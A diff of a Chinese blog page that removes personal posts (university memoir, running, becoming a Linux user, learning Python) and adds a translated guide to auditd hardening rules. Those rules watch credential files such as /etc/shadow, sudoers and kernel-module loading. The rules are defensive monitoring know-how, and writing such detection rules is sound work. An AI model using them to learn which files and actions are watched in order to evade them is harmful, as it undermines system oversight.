-<h2 id="无锡的夜">无锡的夜</h2><p>晚上去跑步时，JNU的夜shocked me.当站在宽阔的操场上，凝视着安详高远的天空，宁静平和的初升明月,南边一溜美丽祥和的云朵,东边若隐若现的城市灯火，黑暗中飒飒作响的树影，西边绵延而沉默的山峦，头顶点点的星辰。夏夜的晚风穿过身旁，撩拨着我的衣裳，也撩拨着我的神经。</p>
-<h2 id="好像那片云">好像那片云</h2><p>云千奇百怪，诡奇壮丽，它们是天空最亮丽的风景线。它洁白如雪过，它压抑阴沉的想要坠落过,它曾排山倒海压来，也曾宁静的好像不变的山峦。</p>
-<p>然而它最终要散，无影无踪。</p>
-<p>就像我所追求的，我所喜爱的，我所经历的，我所拥有的。</p>
-<p>在生命经历一个个奇幻的形态后烟消云散。</p>
-<p>曾经的美丽只留存在他人的记忆之中。</p>
-<p>跑完步时，南边的云散得无影无踪，好像从未存在。</p>
-<h2 id="linuxer周年记">linuxer周年记</h2><p>入门是件很奇特的事，我视之为缘分,思之为注定。</p>
-<p>一切在阴差阳错间成就，也许像从前曾有缘过的一样缘尽于某日</p>
-<p>然而就这么改变了我一年的人生</p>
-<p>之前生命中点点阴差阳错点点成线，汇集成今</p>
-<p>那个轨迹，就是人们所说的命运？</p>
-<p>是否在他人眼里是彻头彻尾的宅loser？</p>
-<p>是否被看成不通世情的sb？</p>
-<p>It dosen’t matter.</p>
-<p>我喜欢开源社区的氛围，开放、共享、自由与进步。</p>
-<p>我认同黑客的精神，自强、求索、执着、包容。</p>
-<p>我相信人生有很多值得去体验和经历的事，有很多有趣的东西：哲学、文学、艺术、数学、计算机、还有风景，还有girl……</p>
-<p>我相信世界充满乐趣和值得探索的问题。</p>
-<p>感谢上苍让我看到一个热心、分享、积极探索、奉献的社区。</p>
-<p>很高兴与那些富有创造力、执着、热心、积极探索、充满趣味、积极进步的人交流、从他们那里学习，被他们鞭策、鼓励。</p>
-<p>我觉得这是神赐给我此生的礼物，让我在尘世呼吸到不一样的自由气息，好像来自天堂，重新refresh被功利的世界奴役的疲惫的身躯与心灵。</p>
-<p>那些contributors,是最可爱的人。</p>
-<h2 id="21">21</h2><p>21岁了，爱也好，恨也好，时间不等人。</p>
-<p>看着静美的夜色，忽然想起牡丹亭中几句话，萦绕耳畔：</p>
-<blockquote>
-<p>原来姹紫嫣红开遍，似这般都付与断井颓垣。良辰美景奈何天，便赏心乐事谁家院？朝飞暮卷，云霞翠轩，雨丝风片，烟波画船。锦屏人忒看的这韶光贱！ </p>
-</blockquote>
-<p>光阴不在，这些逝去的日子。</p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/life/2015/11/15/2012-07-13/" itemprop="url">
-                  回忆
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:30+08:00" content="2015-11-15">
-              2015-11-15
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/life/" itemprop="url" rel="index">
-                    <span itemprop="name">life</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/life/2015/11/15/2012-07-13/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/11/15/2012-07-13/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h1 id="回忆">回忆</h1><p>我向来厌恶回忆，当被它的触角在夜幕中拉住，你永远别指望从中抽身，回忆越陷越深，一层一层向过去延伸，好像永远没有终点。</p>
-<p>我向来厌恶面对过去，过去的哀伤与委屈，过去的快乐与迷恋，都在回忆中幻化成不可抑制的情愫与遗憾。回忆越陷越深，它在你的心头缠绕了一圈又一圈，当回忆越行越远，往事便像猴子头上的紧箍咒一样越来越紧，让人压抑的喘不过气。</p>
-<p>不知为什么，感觉往事不堪回首。虽然它普通的不能再普通，虽然它平淡的不能再平淡，但我不愿回头.让记忆随着光阴越流越远吧，我希望永远不要再见到它。</p>
-<p>可是它总是找上我。终有一天，还是要面对自己的懦弱，愚蠢与自私。</p>
-<blockquote>
-<p>有一种被人抛诸脑后的过去，包含一些不该遗忘的点点滴滴。欢笑之余，我将故旧拾起，才刹见自己的薄情。人世间似乎存在着某种公平，每个人都曾被抛掷在他人的遗忘中；而今你所有哽咽难宣的话语，也正是你曾为人所期盼，却永远听不见的字句。</p>
-<p>赫曼· 赫塞—-</p>
-</blockquote>
-<h2 id="大学之前">大学之前</h2><p>不想多说，封尘的不想重启。简单的写下，简单地卸下，轻装面对未来。</p>
-<h2 id="大学">大学</h2><blockquote>
-<p>所谓大学者,非谓有大楼之谓也,有大师之谓也。</p>
-<p>梅贻琦1931年在清华的就职演说—-</p>
-</blockquote>
-<p>说什么好呢，本来没想到来这里。高考之前想去南京大学，考完试知道毁了，打点好好准备了一堆要报的二本大学，一本随手填了个江南大学，只因为作为革命老区的朴素人民，觉得无锡这地方比较发达。报专业的时候报的教育技术，因为自己虽然是学理科的，但一直想搞文科<a href="当年文理分科违心的选了理科，因为我讨厌考政治和历史，估计按我的风格考那个大学都考不上。">^1</a>。但老爸是搞教育的，想这行业尼玛有个毛前途啊，别报这个。我那时当然无所谓了，反正谁知道将来大学毕业做什么，那就这啥 <strong>光信息科学与技术</strong> 吧。</p>
-<p>关于这牛b的专业名我要唠叨两句：还记得去派出所开国防生证明的时候，那位警察大叔来句，唉，你这专业不错啊。我想是么？然后去招生办查分的时候招生办大叔也来了句，你这个专业高科技，有前途。我想看样子没差了。<strong>来到传说中江南第一学府，尼玛来到理学院，再上了三年学，我算知道这是什么玩意了</strong>。</p>
-<p>于是乎阴差阳错来到无锡这地方。初来乍到，这里商业气息以排山倒海之势扑面而来。各路江湖骗子、学长学姐、商业机构、云集此地…… 然后我就不多说了，三年过去，我已经不把这里当大学看了。</p>
-<p>其实也不想黑咱亲爱的大江大，学校风景秀丽，一看就是花大力气大资金维护打造初来的，基本上这个大花园是各路情侣、闲人饭后闲逛的良处。学校四周也到处都是公园，总之风景不错就是了。有这么种感觉，咱大江大就是环蠡湖绿化带的一部分。</p>
-<p>不该跑题的，虽然有很多怨念，但也不是一无是处，好歹教育部直属211大学，有心报这里的别这么就被我的胡言乱语吐槽走了，也许其它地方还不如这儿。</p>
-<h3 id="外联">外联</h3><p>大一上学期，外联还是比较忙的。然后又身在两个组织的外联，于是打了一个学期的酱油<a href="打酱油？按很多人的标准来说，我大学打的酱油真是数不胜数啊。">^2</a>。最后的结果是一分钱没有拉到，不过那时候真是勇气十足啊，跑商店，闯大楼，进政府，当然，脾气好点的会听你说完，脾气差点的也没到轰我的地步…… 然后尼玛有赞助商了宣传也是我们的事，遍历宿舍做宣传，食堂门口发传单，四处张贴海报……</p>
-<p>说到底，我那时不是很给力，不过很有<strong>勇气</strong>。</p>
-<h3 id="骑迹">骑迹</h3><p>也不知为何了，加了个名为骑迹的组织，买了辆 Giant ATX690[^3]，准备暑假远征。没想到暗暗影响了舍友，四个人先花了几天骑车游遍了江南六大古镇，然后我知道我脾气有多差了……总之，因为脾气不好和室友别扭了很抱歉，但一直没说出过口。暑假和社团的兄弟们从学校骑车出发远征北京，难忘的七月啊。然后我又体验到自己脾气有多不好了，然而，抱歉的话一直没说出口，一路都给大家拖后腿了。</p>
-<p>远征之前和骑迹，室友出去都比较多，无锡周边什么的总是去逛逛。到远征结束，基本上再没怎么出去了。最后一次出行在2011年4月26日，骑迹的24小时环太湖活动，光荣的做了压队。没想到之后，再也没骑车出去过了。<a href="因为再后来车丢了，想去也没机会了。不丢也懒得出去了。">^4</a></p>
-<h3 id="泡图书馆">泡图书馆</h3><p>大一经常泡图书馆，别人都以为我在学习，其实都是在看闲书。因为好奇很多偏见、歧视从何而来，为什么人们会这样会那样，好奇人的本性，所以看了好多心理学社会学的书。现在都忘了，当时的笔记可是做了一本又一本……</p>
-<p>最后的相关结论是，基本都是假说……</p>
-<p>那时我第一次认识到人是有多健忘，后来问我一个天天看数学和计算机学科国外论著的室友，你看这能记住吗？他说不行，我问那看了有什么用？他说很多思想会内化成为你的一部分。当时感觉这话安慰的意思多余实际的意义，两年后接触另一个神奇的领域时我才体味到这个意思。</p>
-<h3 id="动漫">动漫</h3><p>在室友旁边看死神，然后感觉不错。然后开始动漫宅化一发不可收拾，先后看了一堆新番旧番。当时痴迷的，借室友mp4看空之境界，借室友电脑看Monster，寒假在家天天看eva。去郑州病房陪父亲的时候，当时还买了本《动感新势力》，没想到那本10年三月的85期，是我唯一买的动漫相关的东西。</p>
-<p>最后，忘记是何年何月，看完Lain、攻壳机动队和虫师之后，口味越来越小众，再未找到入的了法眼的动漫，也就再也没兴致看其它的动漫了。</p>
-<h3 id="小说">小说</h3><p>忘记何时，迷过一阵日系推理小说。大概是远征前的假期，当时图书馆所有能借到的东野圭吾的、京极夏彦的、宫部美雪的……推理小说，到后来痴迷上整个日系文学，村上村树、松本清张、太宰治<a href="《人间失格》是最震撼我的小说之一，另一本是加缪的《局外人》">^5</a>……，唯一遗憾没看《丰饶之美》和《源氏物语》，再后来因为信长之野望这个游戏对整个日本战国史产生兴趣好好研究了一番，扯淡的是又找了本叫《中国历代军事战略（上、下）》<a href="很棒的一本书，纯粹的历史书，很少有这么好看的">^6</a>的看了一遍。</p>
-<p>好了不跑题了，还是说小说。当时手机可以上网，经常用手机上轻小说论坛看小说。《文学少女》那阵真是让我痴迷上了各种小说了，好多图书馆都没有，当时我是疯狂荐购，图书馆方面的回复倒很简单：<em>不适合本馆收藏</em><a href="历史的讽刺在于，它后来买了一大堆我荐购过和没荐购过的轻小说">^7</a>。</p>
-<p>总之，那段日子是动漫、小说、甚至还玩过air的游戏交错的日子。很虚空不是？我只是想从那里发现意义，寻找意义。他人的作品改变了我，启发了我。但意义也仅限于此。我放弃动漫小说、文学时，心头一点感觉都没有。</p>
-<p>对了，忘了讲讲科幻小说。在郑州病房的夜晚，看着阿西莫夫的科幻小说打发漫漫长夜，我才知道科幻小说还可以写得这么棒这么有深度。后来去年寒假，看了遍《光明王》，那种宗教和科技交织的奇幻感觉让我激动万分，于是我找来txt版的把它用<em>LaTeX</em>重新排了一遍。那个时候，又有个东西影响了我。</p>
-<h3 id="Dota">Dota</h3><p>现在，我旁边的室友还在每日忙着dota。</p>
-<p>这是个迷人的游戏，有几个月很喜欢。我在一个游戏中寻找意义，体悟人生，有很多对现实有启发的思想渐渐影响和融入自我。更重要的，拉近了孤独的自己和很多人的关系，一致多年以来我第一次觉得和好多人有的聊的了。然而，仅此而已。之后遇见的东西，让我走火入魔了，几乎彻底把它扔掉了。</p>
-<h3 id="TED">TED</h3><blockquote>
-<p>Ideas worth spreading.</p>
-<p>TED理念—-</p>
-</blockquote>
-<p>TED<a href="http://www.ted.com/" target="_blank" rel="external">1</a>是什么？Technology、Entertainment、Design，有阵对这个特着迷,它展示了一个新奇的世界，你看到这里还有一群人相信思想的力量，充满热情，相信能通过传播思想和理念改变世界，你会不激动吗？当你身边充满着成天感慨无所事事，生命缺乏激情之时你会不喜欢它吗？那时的TED展示给我很多很棒的理念。TEDxWuxi第一场面向大众的分享会当然要去了，设计学院一个学长关于设计的演讲在我心中埋下了”设计友好”的种子，现在看待很多产品和服务，都要想好多……</p>
-<h3 id="数学建模">数学建模</h3><blockquote>
-<p>当然我在大学的时候，还不可能把从前的点点滴滴串连起来，但是当我十年后回顾这一切的时候，真的豁然开朗了。 </p>
-<p>Steve Jobs—-</p>
-</blockquote>
-<p>数学建模对我来说是个阴差阳错的事，如果不是某人这么一晃：我们组队去吧。我绝对不会想着去参加它的，甚至大学两年间从未考虑过数学建模这种事。</p>
-<p>然而晃我的人没有参加，我一个人过去了。</p>
-<p>细节不想多说，黑学校黑这个比赛的也懒得说。总之，从那时开始，人生开始巨变，而这种变化是我的选择，不是身不由己。</p>
-<p>组队时，本来和一个同学说好同队，结果组队时莫名的负了她。慌忙组队之时慌忙组了队，连声抱歉也没说。我觉得自己的一生总是错过了太多道谢和道歉的机会，腼腆的性格也让我无法说出口。</p>
-<p>前面半个月集训很爽，我第一次知道计算机不只是游戏机、影碟机和上网本，第一次发现自己有多强大，从无基础的是写代码越写越high，感觉我们那个房间里那些物联网学院的都没我强大<a href="我自大了，见笑。之前虽然开过matlab课，对计算机毫无兴趣的我都在后面打魔兽的……">^8</a>。然后也算第一次喜欢上了数学，特别是数据挖掘与数据分析。</p>
-<p>后半个月越来越觉得这比赛是在扯淡，痛苦的感觉一天到晚就做题了什么也学不到。</p>
-<p>然后的比赛是我在大学打的又一次酱油，还不好意思地拉着两名想拿成绩的队友一起酱油了。</p>
-<p>最后比赛那天很抱歉没很给力，把本带去蹭学校的网更新ubuntu了，第二天早上正要忙的时候头晕脑胀的睡着了。</p>
-<h3 id="GNU/Linux">GNU/Linux</h3><blockquote>
-<p>Keep it simple,Stupid.</p>
-<p>KISS哲学—-</p>
-</blockquote>
-<p>数学建模时用了一个叫SAS的统计软件，老师表示买不起。买不起？于是我上网查了查，一年几十万。</p>
-<p>这不是重点，重点在于一种叫R的统计语言走进了我的世界，它带我进入了开源的世界。</p>
-<p>也就这么一阴差阳错，无意瞥见的一种和我从来没什么关系的东西吸引了我的注意力，我想找一个做统计分析的强大软件，而SAS盗版都不安逸。然而R的口碑很好<a href="即使现在在国际也是很流行，搞统计的八成特别学术上的八成用它。前阵看到本12年2月出的新书讲R做数据挖掘的，作者竟然一个是政治学家一个是生物学家，给跪了。">^9</a>,据说也很强大，而且开源。嗯？开源是个什么玩意，能吃吗？然后我开始递归的google起来[^10]。</p>
-<p>另外数学建模那阵老见一群飞在天上的大牛们黑word吹<a href="http://www.latex-project.org/" target="_blank" rel="external">LaTeX</a>，我心说LaTeX是什么？于是也开始了在google的递归搜索。</p>
-<p>结果很简单，先是装了个火狐，感觉不错，又阴差阳错装个YLMF OS<a href="一种国人做的linux系统">^11</a>，然后某次本上的XP蓝屏了，我就把windows格了。</p>
-<p>接下来的一年，是折腾的一年。从计算软件到服务器架设，从建站到前端，从排版到图形处理，从文本编辑到设计真是无所不折腾……也渐渐见识了很多领域的东西，没有什么比这个更开阔视野了，人生也从未这么丰富多彩过<a href="副作用是社交基本封闭，与旁人基本没得聊，基本不会接触妹子……以前还会和同学去打打网球什么的，某次受伤后现在只能自己默默跑步了。">^12</a>。设计、哲学、人性、科技、信仰从未这么复杂的交错起来，才明白世界很大，人生很短<a href="请珍惜自己的生命，遵从自己的心。人的生命体验，只有经历过才会明白。就像毛姆《人生的枷锁》中所说：答案只有自己找出才有意义。">^13</a>。</p>
-<h2 id="然后呢">然后呢</h2><p>还有一些愿望,这是关于未来的：</p>
-<ul>
-<li><p>我想去从事并非光科相关的行业，如果身体条件允许的话，我想从事互联网或者数据挖掘的工作</p>
-</li>
-<li><p>全程马拉松，把跑步变成自己的人生习惯之一</p>
-</li>
-<li><p>想学习绘画，图像处理，视觉设计的东西，但并不靠它吃饭</p>
-</li>
-<li><p>想学会弹吉他，因为还有想唱的歌</p>
-</li>
-<li><p>希望将来有空余时间，把那些自己想看的书看完。</p>
-</li>
-<li><p>空闲时能参加开源项目，从中体会hack的乐趣</p>
-</li>
-</ul>
-<h2 id="我的家">我的家</h2><p>随便一想就像收不住的闸，不想了。我不能哭丧着脸回去，人生苦短，我要试着带回去快乐与活力。</p>
-<p>作文一篇，向过去告别，向无锡暂别，我已经<em>21</em>了。</p>
-<hr>
-<h2 id="Footnotes">Footnotes</h2><p>[^3]: 当时社团团购，整个学校就我一个…… 一直没感谢我当时技术部的部长和当时的会长。</p>
-<p>[^10]: 要问我为何不用baidu，我真想不留情面的说那玩意是个垃圾。但鉴于很多人拿他搜盗版搜游戏还凑合，就不黑它了。如果你查的资料是英语居多，或者偏重技术，google基本是唯一的选择。但国内的google一直都不好用，每次搜到东西打不开时或google被重置时，我都想说： <em>fuck gfw</em> 。</p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/test/2015/11/15/2012-07-11/" itemprop="url">
-                  这两天的二逼日子
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:30+08:00" content="2015-11-15">
-              2015-11-15
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/test/" itemprop="url" rel="index">
-                    <span itemprop="name">test</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/test/2015/11/15/2012-07-11/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="test/2015/11/15/2012-07-11/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h1 id="这几天我都干啥了">这几天我都干啥了</h1><p>这几天我都干些啥了呢，在这个幻灯片中，我将做个小结</p>
-<p><img src="http://fmn.rrimg.com/fmn063/20120708/1320/p_large_lamv_658f000005f61261.jpg" alt="dt的tweak"></p>
-<hr>
-<h2 id="为啥我要宅两天">为啥我要宅两天</h2><p>前几天的考研复习那个不亦乐乎，高数终于看了三章不到，概率论终于看了不到三章。我想想怎么着回家前的这几天也得好好学习一阵，可你妹的 <em>我感冒了</em></p>
-<hr>
-<h2 id="那卧病寝室这几天在干吗？">那卧病寝室这几天在干吗？</h2><ul>
-<li>普通说法叫折腾</li>
-<li>文艺说法叫hack</li>
-<li>说得二逼一点我其实就是蛋疼</li>
-</ul>
-<hr>
-<h2 id="水人人水贴吧水论坛">水人人水贴吧水论坛</h2><ul>
-<li>好吧，你之前看到的那个win7 图吧，其实就是我闲的蛋疼用archlinux+kde伪装的，然后到baidu的win8 吧发截图玩</li>
-<li>貌似人人也没少水</li>
-<li>貌似论坛也没少去，什么byr啊，jnrain啊，u 坛啊</li>
-</ul>
-<hr>
-<h2 id="学习python">学习python</h2><h3 id="Why_python">Why python</h3><p>本来是学习sage的，因为看到ustc有个<a href="http://home.ustc.edu.cn/~wyfyw/iSL/" target="_blank" rel="external">创新项目</a>就是推广这个的。最后发现很多python的东西，于是学python去了。</p>
-<h3 id="折腾大略">折腾大略</h3><ul>
-<li>首先配置vim找到了<a href="https://github.com/klen/python-mode" target="_blank" rel="external">python-mode</a>,看视频demo很棒，于是折腾了一天，终于能比较方便的使用了，结果是把supertab插件废掉，系统默认python改成2了，x输入法在vim中用不了了，暂时也许永久地用起了神奇的vimim.</li>
-<li>见byr坛上有连两个帖子热议python,结果是先选了python2</li>
-<li>看看<a href="http://woodpecker.org.cn/abyteofpython_cn/chinese/" target="_blank" rel="external">python 简明教程</a>感觉看着很平滑，没有这么挫败感。一口气看到第九章</li>
-</ul>
-<hr>
-<h2 id="搜集OS娘">搜集OS娘</h2><p>是的，我好好学习了OS娘的相关知识，并搜集了<a href="http://photo.renren.com/photo/306127150/album-647659933?curPage=1" target="_blank" rel="external">一大堆OS娘的图片</a></p>
-<p><img src="http://fmn.rrimg.com/fmn065/20120710/1325/p_large_8tXz_2508000054681263.jpg" alt="OS girl"></p>
-<hr>
-<h2 id="总结一下吧">总结一下吧</h2><p>这两天过得及其惨不忍睹，为什么每天跑一个小时步说感冒就感冒？我在电脑前时间太长了吧……所以<em>回家不带电脑</em>，最好明天也别碰</p>
-<p>这两天过得及其二逼，一早起床坐到电脑前，到晚上念念不舍上床，偶尔吃饭出去下，喝水活动下，上厕所闲逛下……目测旁边忙着dota的和我一样……</p>
-<p>身子更弱了……</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这段代码测试高亮</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"珍爱生命，远离折腾"</span></span><br></pre></td></tr></table></figure>
-<p>靠，我该洗洗睡了……</p>
+<p>审计规则在<code>/etc/audit/audit.rules</code>控制，添加满足你审计需求的规则。该文件中每一行代表一系列传递给<code>auditctl</code>的参数，能用<code>auditctl</code>独立测试。参见<code>/usr/share/doc/audit-version</code>和相关man页面获取更多信息。</p>
+<p>推荐的审计规则在<code>/usr/share/doc/audit-version/stig.rules</code>提供，激活这些规则：</p>
+<pre><code>cp <span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>audit-version<span class="regexp">/stig.rules /</span>etc<span class="regexp">/audit/</span>audit.rules
+</code></pre><p>然后编辑<code>/etc/audit/audit.rules</code>注释掉不适合你的架构的包含<code>arch=</code>的行。然后检查和理解其中的规则，确保需要的规则在合适的架构上被激活。</p>
+<p>检查完所有规则后，阅读以下章节，编辑和激活需要的新规则：</p>
+<pre><code><span class="title">service</span> auditd restart
+</code></pre><h2 id="记录更改日期和时间信息的事件">记录更改日期和时间信息的事件</h2><p>添加以下规则到<code>/etc/audit/audit.rules</code>，设置<code>ARCH</code>为你系统合适的架构，要么是<code>b32</code>，要么是<code>b64</code>:</p>
+<pre><code>-a always,exit -F arch=ARCH -S adjtimex -S settimeofday -S stime -k time-<span class="operator"><span class="keyword">change</span>
+-a <span class="keyword">always</span>,<span class="keyword">exit</span> -<span class="keyword">F</span> arch=ARCH -S clock_settime -<span class="keyword">k</span> <span class="keyword">time</span>-<span class="keyword">change</span>
+-w /etc/<span class="keyword">localtime</span> -<span class="keyword">p</span> wa -<span class="keyword">k</span> <span class="keyword">time</span>-<span class="keyword">change</span></span>
+</code></pre><p>(参见<code>man auditctl</code>)</p>
+<h2 id="记录更改用户/组信息的事件">记录更改用户/组信息的事件</h2><p>添加以下规则到<code>/etc/audit/audit.rules</code>，为了捕捉更改账户变化的事件：</p>
+<pre><code>-w /etc/group -<span class="tag">p</span> wa -k identity
+-w /etc/passwd -<span class="tag">p</span> wa -k identity
+-w /etc/gshadow -<span class="tag">p</span> wa -k identity
+-w /etc/shadow -<span class="tag">p</span> wa -k identity
+-w /etc/security/opasswd -<span class="tag">p</span> wa -k identity
+</code></pre><h2 id="记录更改系统网络环境的事件">记录更改系统网络环境的事件</h2><p>添加以下规则到<code>/etc/audit/audit.rules</code>，根据系统架构设置<code>ARCH</code>为或者<code>b32</code>或者<code>b64</code>：</p>
+<pre><code>-<span class="tag">a</span> exit,always -F arch=ARCH -S sethostname -S setdomainname -k system-locale
+-w /etc/issue -<span class="tag">p</span> wa -k system-locale
+-w /etc/issue<span class="class">.net</span> -<span class="tag">p</span> wa -k system-locale
+-w /etc/hosts -<span class="tag">p</span> wa -k system-locale
+-w /etc/sysconfig/network -<span class="tag">p</span> wa -k system-locale
+</code></pre><h2 id="记录更改系统强制访问存取(MAC)策略的事件">记录更改系统强制访问存取(MAC)策略的事件</h2><p>添加<code>/etc/audit/audit.rules</code>:</p>
+<pre><code>-w /etc/selinux/ -<span class="tag">p</span> wa -k MAC-policy
+</code></pre><h2 id="记录登入注销变更事件的尝试">记录登入注销变更事件的尝试</h2><p>审计系统已经收集了所有用户和root的登录信息。去监视尝试手工更改存储登入事件的文件，向<code>/etc/audit.rules</code>添加以下行：</p>
+<pre><code>-<span class="ruby">w /var/log/faillog -p wa -k logins <span class="comment"># RHEL6中再无这个，pam_tally不再写入其中</span>
+</span>-<span class="ruby">w /var/log/lastlog -p wa -k logins</span>
+</code></pre><h2 id="记录更改进程和会话初始化信息的尝试">记录更改进程和会话初始化信息的尝试</h2><pre><code>-w /<span class="keyword">var</span>/<span class="keyword">run</span>/utmp -p wa -k session
+-w /<span class="keyword">var</span>/<span class="keyword">log</span>/btmp -p wa -k session
+-w /<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp -p wa -k session
+</code></pre><h2 id="确保auditd收集任意存取控制权限更改事件">确保auditd收集任意存取控制权限更改事件</h2><p>最起码审计系统会收集所有用户和root的文件权限更改。添加以下到<code>/etc/audit/audit.rules</code>，设置<code>ARCH</code>为系统合适的架构，要么<code>b32</code>或者<code>b64</code>：</p>
+<pre><code>-a always,<span class="built_in">exit</span> -F arch=ARCH -S chmod -S fchmod -S fchmodat -F auid&gt;=<span class="number">500</span> \
+    -F auid!=<span class="number">4294967295</span> -k perm_mod
+-a always,<span class="built_in">exit</span> -F arch=ARCH -S chown -S fchown -S fchownat -S lchown -F auid&gt;=<span class="number">500</span> \
+    -F auid!=<span class="number">4294967295</span> -k perm_mod
+-a always,<span class="built_in">exit</span> -F arch=ARCH -S setxattr -S lsetxattr -S fsetxattr -S removexattr -S \
+    lremovexattr -S fremovexattr -F auid&gt;=<span class="number">500</span> -F auid!=<span class="number">4294967295</span> -k perm_mod <span class="preprocessor"># 红帽的非权限用户起始uid为<span class="number">500</span>, <span class="number">4294967295</span>为最大<span class="number">32</span>位无符号整数</span>
+</code></pre><h2 id="使用auditd收集未认证的文件访问尝试(失败)">使用auditd收集未认证的文件访问尝试(失败)</h2><p>最起码审计系统收集所有用户和root的未授权文件访问信息。添加以下行到<code>/etc/audit/audit.rules</code>，设置<code>ARCH</code>：</p>
+<pre><code>-a always,exit -F arch=ARCH -S creat -S open -S openat -S <span class="operator"><span class="keyword">truncate</span> -S ftruncate \
+    -<span class="keyword">F</span> <span class="keyword">exit</span>=-EACCES -<span class="keyword">F</span> auid&gt;=<span class="number">500</span> -<span class="keyword">F</span> auid!=<span class="number">4294967295</span> -<span class="keyword">k</span> <span class="keyword">access</span>
+-a <span class="keyword">always</span>,<span class="keyword">exit</span> -<span class="keyword">F</span> arch=ARCH -S creat -S <span class="keyword">open</span> -S openat -S <span class="keyword">truncate</span> -S ftruncate \
+    -<span class="keyword">F</span> <span class="keyword">exit</span>=-EPERM -<span class="keyword">F</span> auid&gt;=<span class="number">500</span> -<span class="keyword">F</span> auid!=<span class="number">4294967295</span> -<span class="keyword">k</span> <span class="keyword">access</span></span>
+</code></pre><h2 id="确保auditd收集权限命令使用的信息">确保auditd收集权限命令使用的信息</h2><p>最起码审计系统收集所有用户和root的权限命令执行信息。这需要为每个要监视执行的<code>setuid</code>或者<code>setgid</code>程序添加规则。</p>
+<p>首先运行以下命令找到所有本地分区<code>PART</code>来生成规则，每个<code>setuid</code>或<code>setgid</code>程序一个规则：</p>
+<pre><code>find PART -xdev \( -perm -<span class="number">4000</span> -o -perm -<span class="number">2000</span> \) -type f | awk {print \
+    <span class="string">"-a always,exit -F path="</span> <span class="variable">$1</span> <span class="string">" -F perm=x -F auid&gt;=500 -F auid!=4294967295 \
+    -k privileged"</span> }
+</code></pre><p>然后添加打印的行到<code>/etc/audit/audit.rules</code>。</p>
+<h2 id="确保auditd搜集导出到介质上的信息(成功)">确保auditd搜集导出到介质上的信息(成功)</h2><p>(我不是很明白，看上去似乎是收集非权限用户的挂载信息)</p>
+<p>最起码审计系统收集所有用户和root的媒体导出事件。添加以下行到<code>/etc/audit/audit.rules</code>，设置<code>ARCH</code>：</p>
+<pre><code>-a always,<span class="built_in">exit</span> -F arch=ARCH -S mount -F auid&gt;=<span class="number">500</span> -F auid!=<span class="number">4294967295</span> -k <span class="keyword">export</span>
+</code></pre><h2 id="确保auditd搜集用户的文件删除事件(成功与失败)">确保auditd搜集用户的文件删除事件(成功与失败)</h2><p>最起码审计系统应该收集所有用户和root的文件删除事件。添加以下行到<code>/etc/audit/audit.rules</code>，设置ARCH：</p>
+<pre><code>-a always,exit -F arch=ARCH -S unlink -S unlinkat -S <span class="operator"><span class="keyword">rename</span> -S renameat -<span class="keyword">F</span> auid&gt;=<span class="number">500</span> \
+    -<span class="keyword">F</span> auid!=<span class="number">4294967295</span> -<span class="keyword">k</span> <span class="keyword">delete</span></span>
+</code></pre><h2 id="确保auditd收集系统管理行为">确保auditd收集系统管理行为</h2><p>(其实就是监视sudoer文件)</p>
+<p>最起码审计系统应该收集用户和root的管理员行为。添加以下到<code>/etc/audit/audit.rules</code>:</p>
+<pre><code>-w /etc/sudoers -<span class="tag">p</span> wa -k actions
+</code></pre><h2 id="确保auditd收集内核加载卸载信息">确保auditd收集内核加载卸载信息</h2><p>添加以下到<code>/etc/audit/audit.rules</code>，设置ARCH：</p>
+<pre><code>-w /sbin/insmod -<span class="tag">p</span> x -k modules
+-w /sbin/rmmod -<span class="tag">p</span> x -k modules
+-w /sbin/modprobe -<span class="tag">p</span> x -k modules
+-<span class="tag">a</span> always,exit -F arch=ARCH -S init_module -S delete_module -k modules
+</code></pre><h2 id="确保auditd配置不可更改">确保auditd配置不可更改</h2><p>添加以下作为<code>/etc/audit/audit.rules</code>的 <em>最后一行</em> ：</p>
